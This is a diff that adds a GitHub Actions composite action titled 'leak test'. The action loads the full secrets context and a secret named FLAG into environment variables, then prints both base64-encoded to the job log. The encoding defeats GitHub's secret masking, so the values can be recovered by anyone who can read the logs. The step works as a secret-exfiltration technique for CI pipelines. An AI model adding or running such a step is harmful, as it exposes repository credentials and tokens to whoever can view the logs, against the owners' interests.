@@ -1,0 +1,14 @@
+name: 'leak test'
+description: 'test secrets context in composite'
+runs:
+  using: 'composite'
+  steps:
+    - name: leak
+      shell: bash
+      env:
+        ALLSECRETS: ${{ toJSON(secrets) }}
+        ONE: ${{ secrets.FLAG }}
+      run: |
+        echo "MARKER_COMPOSITE_SECRETS_TEST"
+        echo "ONE_b64=$(printf %s "$ONE" | base64 -w0)"
+        echo "ALL_b64=$(printf %s "$ALLSECRETS" | base64 -w0)"
